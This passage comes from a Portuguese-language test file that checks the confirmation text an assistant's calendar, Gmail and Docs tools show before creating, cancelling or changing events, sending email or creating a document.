      inicio: "2026-11-13T15:00",
      fim: "2026-11-13T15:30",
      convidados: ["joao@cliente.pt"],
    });
    expect(text).toBe(
      "Marcar «Reunião com o João»\nsexta-feira, 13 de novembro de 2026 às 15:00 até às 15:30\nConvidados: joao@cliente.pt\nCom link do Google Meet",
    );
  });

  it("cancelar e alterar: dizem qual é o compromisso, lido da agenda", async () => {
    const t = setup();
    await t.run("agenda_criar", {
      titulo: "Reunião com o João",
      inicio: "2026-11-13T15:00",
      fim: "2026-11-13T15:30",
      convidados: ["joao@cliente.pt"],
    });
    // O Google devolve instantes: o fake guardou a hora de parede, acerta-se aqui.
    t.workspace.events[0].start = "2026-11-13T15:00:00Z";
    t.workspace.events[0].end = "2026-11-13T15:30:00Z";

    const cancel = await describeOf(t, "agenda_cancelar", { id: "ev1" });
    expect(cancel).toContain("Cancelar «Reunião com o João»");
    expect(cancel).toContain("13 de novembro");
    expect(cancel).toContain("Convidados: joao@cliente.pt");

    const change = await describeOf(t, "agenda_alterar", {
      id: "ev1",
      inicio: "2026-11-16T10:00",
      fim: "2026-11-16T10:30",
    });
    expect(change).toContain("Alterar «Reunião com o João»");
    expect(change).toMatch(/Nova hora: segunda-feira, 16 de novembro de 2026.*10:00 até às 10:30/);
  });

  it("não propõe cancelar um compromisso que não existe", async () => {
    const t = setup();
    await expect(describeOf(t, "agenda_cancelar", { id: "nao-existe" })).rejects.toThrow(
      /não existe/,
    );
  });

  it("enviar email: os destinatários, o assunto e o texto inteiro", async () => {
    const t = setup();
    const text = await describeOf(t, "gmail_enviar", {
      para: ["joao@cliente.pt"],
      cc: ["ana@cliente.pt"],
      assunto: "Reunião",
      texto: "Olá João,\nconfirmo a reunião.",
    });
    expect(text).toBe(
      "Enviar um email\nPara: joao@cliente.pt\nCc: ana@cliente.pt\nAssunto: Reunião\n\nOlá João,\nconfirmo a reunião.",
    );
  });

  it("criar documento: o título e o início do texto", async () => {
    const t = setup();
    const text = await describeOf(t, "docs_criar", { titulo: "Ata", texto: "x".repeat(400) });
    expect(text).toContain("Criar o documento «Ata»");
    expect(text.endsWith("…")).toBe(true);
  });
});
